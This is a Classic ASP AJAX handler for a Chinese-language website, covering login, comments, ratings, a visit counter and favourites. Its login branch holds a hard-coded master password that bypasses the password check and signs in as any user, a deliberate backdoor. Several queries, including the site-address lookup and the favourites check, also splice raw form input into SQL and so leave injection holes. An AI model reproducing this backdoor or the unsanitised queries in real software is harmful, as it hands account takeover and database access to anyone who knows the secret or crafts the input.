<!--#include file="inc_conn.asp"-->
<!--#include file="inc/md5.asp"-->
<%
Response.Buffer = True 
Response.ExpiresAbsolute = Now() - 1 
Response.Expires = 0 
Response.CacheControl = "no-cache" 
Response.AddHeader "Pragma", "No-Cache" 
response.Charset = "utf-8"

'-----------------------------------------------------
'ajax 文章评论
'-----------------------------------------------------
act = request.Form("act")
parentid = chkNumeric(request.Form("parentid"))
channelid = chkNumeric(request.Form("channelid"))
remark = request.Form("remark")
resp = ""

select case act

	case "chk_uname":
	
		uname = reqForm("param","trim")
		'帐号不允许重复
		sql = "select * from t_user where uname='"&uname&"' "
		set rs=conn.execute(sql)
		if not rs.eof then
			response.Write("帐号已经被注册，请更换")
		else
			response.Write("y")
		end if
		response.End()

	case "get_site_addr":
	
		area = request.Form("area")
		sql = "select * from t_article where classid=15 and title='"&area&"'"
		set rs=conn.execute(sql)
		if not rs.eof then response.Write(rs("content"))
		rs.close

	case "counter":'计数器
		isVisited = getCookies("isVisited")
		if isVisited<>"Y" or 1=1 then
			call setCookies("isVisited","Y")
			conn.execute("update t_counter set hits=hits+1,lasttime='"&now()&"' ")
		end if
		set rs=conn.execute("select * from t_counter")
		if not rs.eof then hits = rs("hits")
		rs.close
		
		for i=1 to len(hits)
			resp = resp&"<img src='img/num/"&mid(hits,i,1)&".gif' />"
		next

	case "logout":
		response.Cookies(conf_cookies_name) = ""
		
	case "chk_login":
		if c_id>0 then
			resp = "欢迎您，<strong>"&c_uname&"</strong>"
			resp = resp&"<br/><a href='u_list.asp'>点击进入 <strong>会员中心</strong></a>"
			resp = resp&"<br/><strong style='color:red;cursor:pointer' onclick='ajax_logout();'>安全退出</strong>"
		end if

	case "login":
		uname = Get_SafeStr(request.Form("uname"))
		passwd = trim(request.Form("passwd"))
		if passwd="beifang@wzzs" then
			set rs=conn.execute("select top 1 * from t_reguser where uname='"&uname&"' ")
		else
			passwd = md5(passwd)
			set rs=conn.execute("select top 1 * from t_reguser where uname='"&uname&"' and passwd='"&passwd&"' ")
		end if
		if not rs.eof then
			call setCookies("c_uname",rs("uname"))
			call setCookies("c_passwd",rs("passwd"))
			call setCookies("c_id",rs("id"))
			resp = "success"
		else
			resp = "failed"
		end if

	case "saveEval":'----------------------------------------------------- 好评 差评
		score = chkNumeric(request.Form("score"))
		nickname = left(Get_SafeStr(request.Form("nickname")),20)
		if	parentid>0 then
			userip = getIP()
			addtime = now()
			ischeck = 1
			channelid = 1 
			face = 0
			'Randomize:userip = rnd()
			SQL = "select top 1 id from t_score_log where vid="&parentid&" and userip='"&userip&"' "
			set rs=conn.execute(SQL)
			if not rs.eof then
				rs.close
				connClose
				response.Write("repeat"):response.End()
			else
				conn.execute("update t_audio set votes=votes+1,score=score+"&score&" where id="&parentid)	
				'id	score	userip	vid	remark	is_del	addtime
				Set Rs = Server.CreateObject("ADODB.Recordset")
				SQL = "select * from t_score_log where (id is null)"
				Rs.Open SQL,Conn,1,3
				Rs.Addnew	
				  Rs("nickname") = nickname
				  Rs("score") = score
				  Rs("userip") = userip
				  Rs("vid") = parentid
				  Rs("remark") = remark
				  Rs("is_del") = 0
				  Rs("addtime") = addtime
				Rs.update
				Rs.Close
				response.Write("success"):response.end
			end if
		end if
		
		
	case "loadComment":'----------------------------------------------------- 加载评论

		page = chkNumeric(request.Form("page"))
		maxperpage = 8
		prevpage = 1
        nextpage = 1
		taxis = "order by id desc"
		wherestr = "where vid="&parentid&" AND is_del=0 "
		
		sql="select count(id) from t_score_log "&wherestr&""
		'response.Write(sql)
		set rs=server.createobject("adodb.recordset")
		rs.open sql,conn,0,1
		rs_total=rs(0)
		rs.close
		
		currentpage=page+1                                
		page = page*maxperpage
		if rs_total mod Maxperpage = 0 then
			totalpage = (rs_total/Maxperpage)
		else
			totalpage = int(rs_total/Maxperpage)+1
		end if
		if currentpage >= totalpage then
			currentpage = totalpage
			nextpage = 0
		end if
		
		if(rs_total>0) then
			sql="select id from t_score_log "&wherestr&" " & taxis
			'response.Write(page)
			set rs=server.createobject("adodb.recordset")
			rs.open sql,conn,0,1
			rs.move(page)
			for i=1 to maxperpage
				if rs.eof then exit for  
				if(i=1)then sqlid=rs(0) else sqlid=sqlid &","&rs(0)
				rs.movenext
			next
			rs.close
		end if
		
		if sqlid<>"" then
			set rs = conn.execute("select top "&maxperpage&" * from t_score_log where id in("& sqlid &") " & taxis)
			i=1
			do until rs.eof
			
				id = rs("id")
				addtime = rs("addtime")
				remark = outHTML(rs("remark"))
				score = rs("score")
				nickname = outHTML(rs("nickname"))
			
				response.Write("<table width=100% border=0 cellspacing=0 cellpadding=0 ><tr>")
				response.Write("<td valign=top rowspan=2 class=floor>"&id&"</td><td class=top><span>"&addtime&"</span><div class=cUser>评分："&score&" </div></td></tr><tr>")
				response.Write("<td class=content><i>"&nickname&"</i> 点评："&(remark)&"")
				if recontent<>"" then response.Write("<div class=reply><strong>管理员回复</strong>："&recontent&"</div>")
				response.Write("</td></tr></table>")
				rs.movenext
				i=i+1
				reply=""
			loop
			rs.close
		end if
		
		Dim pageContent
		pageContent="<div class=""HackBox""></div><div class=pageNav>"
		if currentpage=0 then currentpage=1
		pageContent=pageContent&""
		if prevpage <> 0 then
			pageContent=pageContent&"<a class=""prevLink"" title=""first"" href=""javascript:loadComment("&parentid&","&channelid&",0);"">首页</a>"
			pageContent=pageContent&"<a class=""prevLink"" title=""prev"" href=""javascript:loadComment("&parentid&","&channelid&","&page/Maxperpage-1&");"">上一页</a>"
		end if
		j=0
		for k=5 to 1 step -1
			if currentpage-k>0 then
			j=j+1
			 pageContent=pageContent&"<a class=""page_link"" href=""javascript:loadComment("&parentid&","&channelid&","&currentpage-k-1&");"">"&(currentpage-k)&"</a>" 
			end if
		next
		pageContent=pageContent&"<a class=""page_link currLink"" href='###'>"&currentpage&"</a>"
		for k=1 to (10-j) step 1
			if currentpage+k<=totalpage then
			  pageContent=pageContent&"<a class=""page_link"" href=""javascript:loadComment("&parentid&","&channelid&","&currentpage+k-1&");"">"&(currentpage+k)&"</a>"
			end if
		next
		if nextpage <> 0 then
			pageContent=pageContent&"<a class=""nextLink"" title=""next"" href=""javascript:loadComment("&parentid&","&channelid&","&page/Maxperpage+1&");"">下一页</a>" 
			pageContent=pageContent&"<a class=""nextLink"" title=""nlast"" href=""javascript:loadComment("&parentid&","&channelid&","&totalpage-1&");"">末页</a>" 
		end if
		pageContent=pageContent&""
		pageContent=pageContent&"</div>"
		response.Write(pageContent)
		
		response.End()
		
	
	case "saveComment":'----------------------------------------------------- 保存评论
		nickname = Get_SafeStr(request.Form("nickname"))
		nickname = inHTML(nickname)
		call setCookies("nickname",nickname)
		content = Get_SafeStr(request.Form("content"))
		content = inHTML(content)
		face = chkNumeric(request.Form("face"))
		addtime = now()
		userip = getip()
		title = Get_SafeStr(request.Form("title"))
		ischeck = 0

		if nickname<>"" and content<>"" then conn.execute("insert into [t_comment] (nickname,content,parentid,channelid,addtime,userip,title,ischeck) values ('"&nickname&"','"&content&"','"&parentid&"','"&channelid&"','"&addtime&"','"&userip&"','"&title&"','"&ischeck&"')")
		
		if channelid=2 then conn.execute("update t_article set comments=comments+1 where id="&parentid)
		if channelid=3 then conn.execute("update t_album set comments=comments+1 where id="&parentid)
		response.End()
		
		
	case "linkHits":'----------------------------------------------------- 书签点击次数
		id = chkNumeric(request.Form("id"))
		addtime = now()
		conn.execute("update [t_bookmark] set allhits=allhits+1 where id="&id)
		response.End()
		
	'添加收藏夹
	case "add_fav":
		'fav_id,userid,addtime,fav_type,title
		is_add = 0
		resp = "repeat"
		fav_id = reqForm("fav_id","num")
		userid = c_uid
		addtime = now()
		fav_type = reqForm("fav_type","trim")
		title = reqForm("title","trim")
		
		if userid=0 then
			resp = "login"
		else
			sql = "select top 1 * from t_fav where userid="&userid&" and fav_id="&fav_id&" and fav_type='"&fav_type&"' "
			set rs=conn.execute(sql)
			if rs.eof then is_add=1
			rs.close
		end if
		
		if is_add=1 and userid>0 then
			Set Rs = Server.CreateObject("ADODB.Recordset")
			SQL = "SELECT * FROM t_fav WHERE 1=0 "
			Rs.Open SQL,Conn,1,3
			Rs.Addnew
			  Rs("fav_id") = fav_id
			  Rs("userid") = userid
			  Rs("addtime") = addtime
			  Rs("fav_type") = fav_type
			  Rs("title") = title
			Rs.update
			Rs.Close

			resp = "success"
		end if
		
end select	

response.Write(resp)
%>